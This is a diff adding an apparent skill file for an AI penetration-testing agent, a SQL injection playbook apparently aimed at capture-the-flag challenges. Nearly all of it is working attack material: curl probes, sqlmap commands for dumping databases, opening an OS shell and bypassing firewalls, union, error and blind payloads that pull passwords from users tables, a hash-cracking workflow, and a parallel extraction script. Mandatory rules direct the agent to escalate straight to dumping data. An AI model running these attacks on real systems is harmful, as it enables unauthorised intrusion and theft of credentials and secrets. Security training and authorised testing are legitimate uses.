@@ -1,0 +1,262 @@
+---
+name: sqli
+description: "SQL Injection — automated and manual exploitation of unsanitized SQL queries. Covers Union-based, Error-based, Blind (Boolean/Time-based), and Stacked queries. Includes sqlmap automation with WAF bypass tamper scripts."
+metadata:
+  mitre_attack: T1190
+  when_to_use: "sql injection, sqli, sqlmap, union select, blind sql, boolean sql, time-based sql, error-based sql, stacked queries, information_schema, database dump, mysql, postgresql, mssql, sqlite, oracle, sql query, sql error, single quote, order by, group by"
+---
+
+# SQL Injection
+
+Exploits unsanitized user input in SQL queries. Types: Union-based, Error-based, Blind (Boolean/Time-based), and Stacked queries.
+
+## Detection
+```bash
+# Single quote error test
+curl -s 'https://<TARGET>/page?id=1%27' -o sqli_test_quote.txt
+
+# Boolean test
+curl -s 'https://<TARGET>/page?id=1+AND+1=1' -o sqli_true.txt
+curl -s 'https://<TARGET>/page?id=1+AND+1=2' -o sqli_false.txt
+
+# Time-based blind
+curl -s 'https://<TARGET>/page?id=1%27+AND+SLEEP(5)--+-' --max-time 10 -w '\nTime: %{time_total}s\n' -o sqli_time.txt
+```
+
+## sqlmap — Automated Exploitation
+```bash
+# Basic detection and exploitation
+sqlmap -u 'https://<TARGET>/page?id=1' --batch --output-dir sqlmap_<TARGET>/
+
+# Aggressive scan (higher risk/level)
+sqlmap -u 'https://<TARGET>/page?id=1' --batch --risk 3 --level 5 --output-dir sqlmap_<TARGET>/
+
+# POST request
+sqlmap -u 'https://<TARGET>/login' --data 'user=admin&pass=test' --batch --output-dir sqlmap_<TARGET>/
+
+# With cookies/headers
+sqlmap -u 'https://<TARGET>/page?id=1' --cookie 'session=<TOKEN>' -H 'X-Custom: value' --batch --output-dir sqlmap_<TARGET>/
+
+# Enumerate databases
+sqlmap -u 'https://<TARGET>/page?id=1' --batch --dbs --output-dir sqlmap_<TARGET>/
+
+# Dump specific table
+sqlmap -u 'https://<TARGET>/page?id=1' --batch -D <DATABASE> -T <TABLE> --dump --output-dir sqlmap_<TARGET>/
+
+# OS shell (if stacked queries + privileges)
+sqlmap -u 'https://<TARGET>/page?id=1' --batch --os-shell --output-dir sqlmap_<TARGET>/
+
+# Tamper scripts for WAF bypass
+sqlmap -u 'https://<TARGET>/page?id=1' --batch --tamper=space2comment,between,randomcase --output-dir sqlmap_<TARGET>/
+```
+
+## Blind SQLi Fast-Path (MANDATORY when tag is `blind_sqli`)
+
+When the challenge tag includes `blind_sqli`, skip exploratory probing and go straight to confirmation + sqlmap:
+
+1. Run ONE time-based probe and ONE boolean differential in your first exploit bash call:
+   ```bash
+   # Time-based oracle confirmation
+   curl -s "http://<TARGET>/page?id=1' AND SLEEP(5)--+-" --max-time 10 -w '\nTime: %{time_total}s\n' -o blind_time.txt
+   # Boolean differential
+   curl -s "http://<TARGET>/page?id=1' AND 1=1--+-" -o blind_true.txt
+   curl -s "http://<TARGET>/page?id=1' AND 1=2--+-" -o blind_false.txt
+   ```
+2. If either confirms (time delay ≥5s OR boolean diff in response) — launch sqlmap IMMEDIATELY:
+   ```bash
+   sqlmap -u "http://<TARGET>/page?id=1" --technique=BT --batch --dump --threads=5 \
+     --output-dir sqlmap_blind/ 2>&1 | tee sqlmap_blind.log &
+   ```
+3. Do NOT iterate manual character extraction. Once the time-based or boolean differential confirms the vector, the next bash call MUST launch sqlmap or a scripted harness — not another confirmation probe.
+
+## Manual-vs-Tool Decision Rule (MANDATORY)
+
+Once SQLi is confirmed (any of: error string, boolean differential, time delay), follow this escalation:
+
+| State | Action |
+|-------|--------|
+| SQLi confirmed, no extraction yet | Run `sqlmap --batch -u "<URL>" --dump --threads=5` FIRST |
+| sqlmap fails or is blocked (WAF, custom encoding) | Write ONE harness script (Python/bash) that does length-probe → binary-search → reconstruct in a single invocation |
+| Harness produces partial output | LET IT FINISH. Do NOT switch to manual curl probes. Do NOT edit_file the running harness. |
+| Harness completes with partial extraction | Submit/verify the partial result before launching a second harness |
+
+**Anti-pattern**: iterating dozens of manual single-character curls when `sqlmap --dump` would extract the same column in one invocation. Manual single-char extraction is a teaching exercise, not an attack technique against a confirmed sink.
+
+**Hard rule**: once SQLi is confirmed (any of: error string, boolean differential, time delay), the next bash call MUST escalate to sqlmap or a scripted harness. Iterating manual character probes after confirmation is the canonical mis-allocation in this skill.
+
+## Manual Techniques
+
+**Union-Based**
+```sql
+-- Determine column count
+ORDER BY 1-- -
+ORDER BY 2-- -
+-- ... increment until error
+
+-- Extract data via UNION
+' UNION SELECT 1,2,3-- -
+' UNION SELECT username,password,3 FROM users-- -
+' UNION SELECT table_name,column_name,3 FROM information_schema.columns-- -
+```
+
+**Error-Based (MySQL)**
+```sql
+-- ExtractValue
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))-- -
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user FROM mysql.user LIMIT 1),0x7e))-- -
+
+-- UpdateXML
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)-- -
+```
+
+**Blind Boolean**
+```sql
+' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'-- -
+' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>96-- -
+```
+
+**Blind Time-Based**
+```sql
+-- MySQL
+' AND IF(1=1,SLEEP(5),0)-- -
+' AND IF((SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a',SLEEP(5),0)-- -
+
+-- MSSQL
+'; WAITFOR DELAY '0:0:5'-- -
+
+-- PostgreSQL
+'; SELECT pg_sleep(5)-- -
+```
+
+## Blind SQLi — Bulk Extraction Strategies
+
+When boolean-blind or time-blind is confirmed, character-by-character extraction is slow. Use these strategies to accelerate data retrieval.
+
+**Binary search (halving ASCII range)**
+```sql
+-- Narrows each character to 7 bits instead of 95 guesses
+' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64-- -
+' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>96-- -
+' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>112-- -
+```
+
+**Bit-by-bit extraction (7 requests per char, no false positives)**
+```sql
+-- Extract bit 7 (MSB) of char at position 1
+' AND (ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>>6)&1=1-- -
+-- Repeat for bits 6..0, reconstruct with: chr(sum(bit_n * 2^n))
+```
+
+**Batch length check before extraction**
+```sql
+-- Know total length first to bound the loop
+' AND LENGTH((SELECT password FROM users LIMIT 1))>15-- -
+' AND LENGTH((SELECT password FROM users LIMIT 1))=32-- -
+```
+
+**UNION-based fallback if error mode unlocks mid-session**
+```sql
+-- If WAF relaxes after auth or error context changes, retry UNION
+' UNION SELECT NULL,password,NULL FROM users-- -
+```
+
+**sqlmap turbo flags for blind (use only when manual PoC is confirmed)**
+```bash
+# --technique=B (boolean) or T (time), --level=3, --threads up to 10
+sqlmap -u "http://target/page?id=1" --technique=BT --level=3 --threads=5 \
+  --dbms=mysql -D targetdb -T users -C username,password --dump --batch
+```
+
+**Extraction priority order**
+1. Schema names (`information_schema.schemata`)
+2. Table names (`information_schema.tables WHERE table_schema=database()`)
+3. Column names (`information_schema.columns`)
+4. High-value columns: `password`, `token`, `secret`, `api_key`, `flag`
+
+## Post-Extraction Hash Cracking Workflow
+
+When SQLi extraction yields a hash (MD5/SHA1/bcrypt/etc.), crack it IMMEDIATELY — do not custom-build a wordlist or guess variants manually:
+
+```bash
+HASH="<extracted_hash>"
+echo "$HASH" > /tmp/crack.hash
+
+# Step 1: try common trivial passwords in-process (covers ~60% of CTF hashes)
+for c in "admin" "password" "123456" "password123" "root" "toor" "letmein" "qwerty" \
+          "admin123" "test" "guest" "user" "changeme" "secret" "p@ssword"; do
+  # MD5
+  echo -n "$c" | md5sum | grep -qi "${HASH}" && echo "MD5 MATCH: $c" && break
+  # SHA1
+  echo -n "$c" | sha1sum | grep -qi "${HASH}" && echo "SHA1 MATCH: $c" && break
+  # SHA256
+  echo -n "$c" | sha256sum | grep -qi "${HASH}" && echo "SHA256 MATCH: $c" && break
+done
+
+# Step 2: wordlist crack with hashcat (if installed)
+# Identify hash type: hashcat --identify /tmp/crack.hash
+hashcat -a 0 /tmp/crack.hash /usr/share/wordlists/rockyou.txt --quiet 2>/dev/null | head -5
+
+# Step 3: john fallback
+john /tmp/crack.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 2>/dev/null
+john /tmp/crack.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha1 2>/dev/null
+john --show /tmp/crack.hash 2>/dev/null
+
+# Step 4: application-context variants (username, app name as base)
+APP_USER="admin"  # replace with extracted username
+for c in "${APP_USER}" "${APP_USER}123" "${APP_USER}!" "${APP_USER}@123" "${APP_USER}2024"; do
+  echo -n "$c" | md5sum | grep -qi "${HASH}" && echo "CONTEXT MATCH: $c" && break
+done
+```
+
+**Hard rule**: Do NOT write a custom character-by-character brute-force loop. Use hashcat/john — they are 1000x faster. If the hash is bcrypt (`$2b$`), cost >12 makes cracking infeasible; pivot to finding a password-reset flow or auth bypass instead.
+
+## Blind SQLi: Parallel Character Extraction Blueprint
+
+When sqlmap is unavailable or blocked and boolean/time-blind is confirmed, run character extractions in parallel — never sequentially.
+
+```bash
+# Step 1: probe string length first (binary search)
+TARGET_URL="http://<TARGET>/page?id="
+TARGET_EXPR="(SELECT password FROM users LIMIT 1)"
+
+for len in 16 32 48 64; do
+  resp=$(curl -s "${TARGET_URL}1' AND LENGTH(${TARGET_EXPR})=${len}--+-")
+  echo "$len: $(echo "$resp" | wc -c) bytes"
+done
+# Pick whichever length shows the "true" response size
+
+STR_LEN=32  # set to confirmed length
+
+# Step 2: parallel character extraction (10-20 concurrent jobs)
+WORKSPACE="$(pwd)"
+mkdir -p "${WORKSPACE}/blind_chars"
+
+for pos in $(seq 1 "$STR_LEN"); do
+  (
+    for ascii in $(seq 32 126); do
+      resp=$(curl -s "${TARGET_URL}1' AND ASCII(SUBSTRING(${TARGET_EXPR},${pos},1))=${ascii}--+-")
+      # Detect "true" response by comparing size to known-true baseline
+      if echo "$resp" | grep -q "<KNOWN_TRUE_MARKER>"; then
+        echo "$ascii" > "${WORKSPACE}/blind_chars/pos_${pos}.txt"
+        break
+      fi
+    done
+  ) &
+  # Throttle: allow max 20 concurrent jobs
+  (( (pos % 20) == 0 )) && wait
+done
+wait
+
+# Step 3: reconstruct string from per-position files
+python3 -c "
+import os, glob
+chars = {}
+for f in glob.glob('${WORKSPACE}/blind_chars/pos_*.txt'):
+    pos = int(os.path.basename(f).replace('pos_','').replace('.txt',''))
+    chars[pos] = chr(int(open(f).read().strip()))
+result = ''.join(chars[p] for p in sorted(chars))
+print('Extracted:', result)
+"
+```
+
+**HARD RULE**: Once string length is known, the NEXT bash call MUST launch the parallel extraction loop above — not a single-character sequential probe. Sequential extraction at 1 req/char on a 32-char secret = 32 round trips minimum; parallel at 20 concurrent = ≤2 rounds.
